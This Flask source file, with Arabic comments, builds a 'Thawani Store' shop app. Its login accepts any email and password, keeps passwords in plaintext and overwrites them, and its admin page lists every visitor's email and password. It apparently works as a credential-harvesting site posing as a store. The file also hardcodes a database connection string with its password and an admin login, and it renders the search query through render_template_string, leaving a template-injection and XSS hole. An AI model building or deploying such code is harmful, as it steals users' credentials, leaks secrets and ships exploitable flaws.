import os
import uuid
import logging
import datetime
import traceback
import psycopg2
from psycopg2.extras import DictCursor
from functools import wraps
from flask import Flask, request, render_template_string, redirect, session, url_for, flash, abort

# ==========================================
# 1. الإعدادات والربط بـ Neon (ثابتة تماماً)
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = "Thawani_Store_Secure_2026_Fixed"

# الرابط الخاص بك من Neon
DATABASE_URL = "postgresql://neondb_owner:npg_LfrcOy0oTV6F@ep-bold-voice-an2t0k43.c-6.us-east-1.aws.neon.tech/neondb?sslmode=require"

UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static', 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, cursor_factory=DictCursor)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    try:
        # جدول المستخدمين معدل ليشمل تسجيل الدخول وحفظ كلمة السر كما هي
        cur.execute('''CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY, 
            email TEXT UNIQUE NOT NULL, 
            password TEXT NOT NULL, 
            is_admin INTEGER DEFAULT 0,
            last_login TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        cur.execute('''CREATE TABLE IF NOT EXISTS products (
            id SERIAL PRIMARY KEY, name TEXT NOT NULL, price DECIMAL NOT NULL, 
            img TEXT NOT NULL, category TEXT NOT NULL, description TEXT, is_active INTEGER DEFAULT 1)''')

        cur.execute('''CREATE TABLE IF NOT EXISTS categories (
            id SERIAL PRIMARY KEY, name TEXT UNIQUE NOT NULL)''')

        cur.execute('''CREATE TABLE IF NOT EXISTS cart (
            id SERIAL PRIMARY KEY, user_email TEXT NOT NULL, product_id INTEGER NOT NULL, quantity INTEGER DEFAULT 1, UNIQUE(user_email, product_id))''')

        cur.execute('''CREATE TABLE IF NOT EXISTS orders (
            id SERIAL PRIMARY KEY, user_email TEXT NOT NULL, full_name TEXT NOT NULL, phone TEXT NOT NULL, card_img TEXT NOT NULL, items_details TEXT NOT NULL, total_price DECIMAL NOT NULL, status TEXT DEFAULT 'pending', notes TEXT, accepted_at TIMESTAMP, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')

        # حساب الإدارة
        cur.execute("SELECT id FROM users WHERE email='qwerasdf1234598760@gmail.com'")
        if not cur.fetchone():
            cur.execute("INSERT INTO users (email, password, is_admin) VALUES (%s, %s, 1)", ('qwerasdf1234598760@gmail.com', 'qaws54321'))
        
        conn.commit()
    finally:
        cur.close()
        conn.close()

init_db()

# ==========================================
# 2. التصميم CSS (شامل كل الميزات)
# ==========================================
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
    body { font-family: 'Tajawal', sans-serif; direction: rtl; background: #f4f7f6; margin: 0; padding-bottom: 80px; }
    header { background: #1a237e; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; }
    .search-box { padding: 12px; background: white; border-bottom: 1px solid #ddd; display: flex; gap: 8px; }
    .search-box input { flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px; outline: none; }
    .container { padding: 12px; display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.05); border: 1px solid #eee; }
    .card img { width: 100%; height: 130px; object-fit: cover; }
    .btn { background: #1a237e; color: white; border: none; padding: 10px; width: 100%; border-radius: 8px; cursor: pointer; text-decoration: none; display: block; text-align: center; font-size: 14px; }
    .admin-table { width: 100%; border-collapse: collapse; background: white; font-size: 13px; margin-top: 10px; }
    .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 10px; text-align: center; }
    .eye-btn { cursor: pointer; background: #e8eaf6; border: none; padding: 4px 8px; border-radius: 5px; color: #1a237e; font-size: 16px; }
    .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 2px solid #eee; }
    .nav-item { color: #555; text-decoration: none; font-size: 12px; display: flex; flex-direction: column; align-items: center; }
</style>
"""

# ==========================================
# 3. المسارات البرمجية (Routes)
# ==========================================

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    search_q = request.args.get('q', '')
    conn = get_db_connection()
    cur = conn.cursor()
    
    if search_q:
        cur.execute("SELECT * FROM products WHERE is_active=1 AND name ILIKE %s", (f'%{search_q}%',))
    else:
        cur.execute("SELECT * FROM products WHERE is_active=1")
    
    products = cur.fetchall()
    cur.close()
    conn.close()
    
    search_html = f'''
    <form class="search-box" action="/">
        <input name="q" placeholder="ابحث عن منتجك هنا..." value="{search_q}">
        <button class="btn" style="width: 50px; font-size: 18px;">🔍</button>
    </form>
    '''
    
    prod_html = ""
    for p in products:
        prod_html += f'''
        <div class="card">
            <img src="/static/uploads/{p['img']}" onerror="this.src='https://placehold.co/200x150?text=Thawani'">
            <div style="padding:10px;">
                <div style="font-size:13px; height:40px; overflow:hidden; font-weight:bold;">{p['name']}</div>
                <div style="color:#2e7d32; font-weight:bold; margin:8px 0;">{p['price']:.3f} OMR</div>
                <a href="/add_to_cart/{p['id']}" class="btn">إضافة للسلة 🛒</a>
            </div>
        </div>'''
    
    nav = '''<div class="bottom-nav">
        <a href="/" class="nav-item">🏠 <span>الرئيسية</span></a>
        <a href="/cart" class="nav-item">🛒 <span>السلة</span></a>
        <a href="/orders" class="nav-item">📦 <span>طلباتي</span></a>
    </div>'''
    
    body = f'<header>THAWANI STORE</header>{search_html}<div class="container">{prod_html or "<p style=\'grid-column: span 2; text-align:center; padding:50px;\'>لا توجد منتجات تطابق بحثك</p>"}</div>{nav}'
    return render_template_string(f"<html><head>{CSS}</head><body>{body}</body></html>")

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO users (email, password) VALUES (%s, %s) ON CONFLICT (email) DO UPDATE SET password=%s, last_login=CURRENT_TIMESTAMP", (email, password, password))
        conn.commit()
        session['user'] = email
        session['is_admin'] = (email == "qwerasdf1234598760@gmail.com" and password == "qaws54321")
        cur.close()
        conn.close()
        return redirect('/')
    
    return render_template_string(f"<html><head>{CSS}</head><body style='display:flex; align-items:center; justify-content:center; height:100vh; margin:0;'><div style='background:white; padding:30px; border-radius:15px; width:85%; max-width:350px; box-shadow:0 10px 25px rgba(0,0,0,0.1);'><h2 style='text-align:center; color:#1a237e;'>ثواني ستور</h2><form method='POST'><input name='email' type='email' placeholder='البريد الإلكتروني' required style='width:100%; padding:12px; margin-bottom:15px; border:1px solid #ddd; border-radius:8px;'><input name='password' type='password' placeholder='كلمة المرور' required style='width:100%; padding:12px; margin-bottom:20px; border:1px solid #ddd; border-radius:8px;'><button class='btn'>دخول</button></form></div></body></html>")

@app.route('/admin')
def admin():
    if not session.get('is_admin'): return abort(403)
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT email, password, last_login FROM users ORDER BY last_login DESC")
    users = cur.fetchall()
    cur.close()
    conn.close()
    
    user_rows = ""
    for i, u in enumerate(users):
        user_rows += f'''
        <tr>
            <td style="word-break: break-all;">
                <span id="em-{i}">***********</span>
                <button class="eye-btn" onclick="toggle('em-{i}', '{u['email']}')">👁️</button>
            </td>
            <td>
                <span id="ps-{i}">***********</span>
                <button class="eye-btn" onclick="toggle('ps-{i}', '{u['password']}')">👁️</button>
            </td>
            <td>{u['last_login'].strftime('%m/%d %H:%M')}</td>
        </tr>'''
    
    body = f'''
    <header>لوحة الإدارة - الزوار</header>
    <div style="padding:15px;">
        <h4 style="margin-bottom:10px;">👥 إيميلات المسجلين:</h4>
        <table class="admin-table">
            <tr style="background:#eee;"><th>الإيميل</th><th>الباسورد</th><th>الوقت</th></tr>
            {user_rows}
        </table>
        <br><a href="/" class="btn" style="background:#555;">الرجوع للمتجر</a>
    </div>
    <script>
    function toggle(id, val) {{
        let el = document.getElementById(id);
        el.innerText = (el.innerText === "***********") ? val : "***********";
    }}
    </script>'''
    return render_template_string(f"<html><head>{CSS}</head><body>{body}</body></html>")

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
